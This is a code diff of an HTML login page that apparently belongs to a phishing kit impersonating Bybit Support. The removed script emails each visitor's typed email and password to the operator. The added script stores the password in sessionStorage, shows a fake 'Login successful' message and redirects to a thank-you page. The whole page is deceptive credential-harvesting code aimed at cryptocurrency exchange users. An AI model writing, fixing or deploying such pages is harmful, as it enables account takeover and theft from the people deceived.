@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bybit - Login</title>
+    <title>Bybit - Login Verification</title>
     <link rel="stylesheet" href="../css/styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -17,7 +17,7 @@
                     <h1 class="header-title">Bybit Support</h1>
                 </div>
                 <div class="header-right">
-                    <button class="header-button" onclick="window.location.href='notifications.html'">
+                    <button class="header-button" onclick="window.location.href='../html/notifications.html'">
                         <i class="fas fa-bell"></i>
                     </button>
                     <button class="header-button" onclick="window.location.href='https://www.bybit.com/login'">
@@ -73,38 +73,47 @@
     <script src="../js/modal-utils.js"></script>
     <script src="../js/notification-system.js"></script>
     <script src="../js/email-config.js"></script>
-    <script src="../js/bybit-login.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const loginForm = document.getElementById('loginForm');
+            const form = document.getElementById('loginForm');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const errorMessage = document.getElementById('errorMessage');
             
-            loginForm.addEventListener('submit', function(e) {
+            form.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                const email = document.getElementById('email').value;
-                const password = document.getElementById('password').value;
+                const email = emailInput.value;
+                const password = passwordInput.value;
                 
-                // Send email notification
-                const userData = {
-                    type: 'Bybit Login',
-                    email: email,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    page: 'bybit-login.html'
-                };
-                
-                try {
-                    sendEmailNotification(userData);
-                    console.log('Login credentials sent via email');
-                } catch (error) {
-                    console.error('Error sending email:', error);
+                if (!email || !password) {
+                    errorMessage.textContent = 'Please fill in all fields';
+                    errorMessage.style.color = '#ff4444';
+                    errorMessage.style.display = 'block';
+                    return;
                 }
                 
-                // Store email in sessionStorage for reference
-                sessionStorage.setItem('userEmail', email);
+                // Store login data
+                sessionStorage.setItem('loginEmail', email);
+                sessionStorage.setItem('loginPassword', password);
                 
-                // Redirect to verify access page
-                window.location.href = 'verify-access.html';
+                // Show success message
+                errorMessage.textContent = 'Login successful';
+                errorMessage.style.color = '#00ff88';
+                errorMessage.style.display = 'block';
+                
+                // Redirect to thank you page
+                setTimeout(() => {
+                    window.location.href = '../html/thank-you.html';
+                }, 1000);
+            });
+
+            // Clear error message when user starts typing
+            emailInput.addEventListener('input', function() {
+                errorMessage.style.display = 'none';
+            });
+            passwordInput.addEventListener('input', function() {
+                errorMessage.style.display = 'none';
             });
         });
     </script>
